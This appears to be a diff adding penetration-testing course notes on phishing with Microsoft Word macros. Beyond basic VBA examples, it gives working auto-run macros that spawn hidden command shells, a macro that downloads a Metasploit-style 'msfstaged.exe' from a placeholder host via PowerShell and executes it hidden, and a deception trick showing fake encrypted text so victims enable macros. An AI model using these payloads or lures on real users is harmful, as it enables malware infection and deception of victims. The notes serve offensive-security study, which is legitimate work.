@@ -78,3 +78,170 @@ Code :-
 &nbsp;
 
 # Phising with Microsoft Office
+
+## Basic Macro Payloads
+
+Macros in Word can be added by navigating to Macros option in the View Tab. Now select the current document from the drop down and give the Macro a name and then add it. The macro will be written in VBA (Visual Basic for Applications) Script.
+
+![VBA Editor in Word](/OSEP/Client-Side-Code-Execution-With-Office/images/vba-editor.png)
+
+&nbsp;
+
+### Simple If-Else function in Macros
+
+    Sub MyMacro()
+        Dim myLong As Long
+        myLong = 1
+        If myLong < 5 Then
+            MsgBox ("True")
+        Else
+            MsgBox ("False")
+        End If
+    End Sub
+
+&nbsp;
+
+### For-loop function in Macros
+
+    Sub MyMacro()
+        For counter = 1 To 3
+            MsgBox ("Alert")
+            Next counter
+    End Sub
+
+Note : The Word file should be saved in the legacy .doc extension. Extensions of .docx or .docm block macros from executing.
+
+&nbsp;
+
+## Security Settings of Microsoft Word
+
+Navigate to _File > Options > Trust Center > Trust Center Settings_
+
+The default settings of the Trust Center for macros is "Disable all macros with notification"
+
+![Trust Center default](/OSEP/Client-Side-Code-Execution-With-Office/images/trust-center-default.png)
+
+The Protected View has the following things by default
+
+![Protected View](/OSEP/Client-Side-Code-Execution-With-Office/images/trust-center-protected.png)
+
+## Opening cmd.exe from Macros
+
+There are two methods :
+
+1. Shell function of VBA
+
+   - Initialize a string
+   - Set the value of the string to cmd.exe
+   - Use the Shell function with the vbHide, which sets the window style to (0), hence hides the shell.
+   - Code :
+
+   ```
+        Sub Document_Open()
+            MyMacro
+        End Sub
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+
+        Sub MyMacro()
+            Dim str As String
+            str = "cmd.exe"
+            Shell str, vbHide
+        End Sub
+   ```
+
+2. CreateObject method of the Windows Script Host (WSH)
+
+   - Initialize a string
+   - Set the value of the string to cmd.exe
+   - Use the WScript.shell to pop a command prompt and set the window style to 0 to hide it.
+   - Code :
+
+   ```
+        Sub Document_Open()
+            MyMacro
+        End Sub
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+
+        Sub MyMacro()
+            Dim str As String
+            str = "cmd.exe"
+            CreateObject("Wscript.Shell").Run str, 0
+        End Sub
+   ```
+
+## Powershell with Macros
+
+Code:
+
+    Sub Document_Open()
+        MyMacro
+    End Sub
+
+    Sub AutoOpen()
+        MyMacro
+    End Sub
+
+    Sub MyMacro()
+        Dim str As String
+        str = "powershell (New-Object
+        System.Net.WebClient).DownloadFile('http://<ip>/msfstaged.exe','msfstaged.exe')"
+        Shell str, vbHide
+        Dim exePath As String
+        exePath = ActiveDocument.Path + "\msfstaged.exe"
+        Wait (2)
+        Shell exePath, vbHide
+    End Sub
+
+    Sub Wait(n As Long)
+        Dim t As Date
+        t = Now
+        Do
+            DoEvents
+        Loop Until Now >= DateAdd("s", n, t)
+    End Sub
+
+&nbsp;
+
+Explanation:
+
+1. We first write the macro functions to auto execute macro on opening the word file. (Document_Open and AutoOpen functions)
+2. We initialize a variable called "str" with the string datatype
+3. A powershell payload to download a dropper is assigned to the variable.
+4. The variable "str" is executed in the shell with the Shell function of VBA and the windows style is set to 0 using vbHide to hide the process from the user.
+5. The path of the downloaded file is then fetched using ActiveDocument.Path and the file name is concatenated to this.
+6. The complete path of the downloaded file is stored in a variable.
+7. The variable is executed in the shell with the Shell function of VBA and the windows style is set to 0 using vbHide to hide the process from the user.
+8. The Wait() function acts as a sleep command, it takes the number of seconds as it's argument. It then fetches the current time and adds the inputted wait time. It then waits for the current time to be greater than the previous calculated sum. This acts as a sleep function in VBA.
+
+## Phising user into disabling Protected View and Enabling Macros
+
+- A Simple technique can be used where we put some random encrypted junk as the word content.
+- Then the user has to enable the macros, which replaces the encrypted text into the proper expected content.
+- This tricks the user into thinking they have decrypted the text, while in fact they have enabled macros and disabled the protected view.
+- An autotext template can be added by navigating to the _Insert > Quick Parts > AutoTexts_
+- Create an autotext and save it to the gallery.
+- Now we will use the macros to replace the contents of the document with the one stored in AutoText gallery.
+- Code
+
+```
+    Sub Document_Open()
+        SubstitutePage
+    End Sub
+
+    Sub AutoOpen()
+        SubstitutePage
+    End Sub
+
+    Sub SubstitutePage()
+        ActiveDocument.Content.Select
+        Selection.Delete
+        ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert
+        Where:=Selection.Range, RichText:=True
+    End Sub
+```
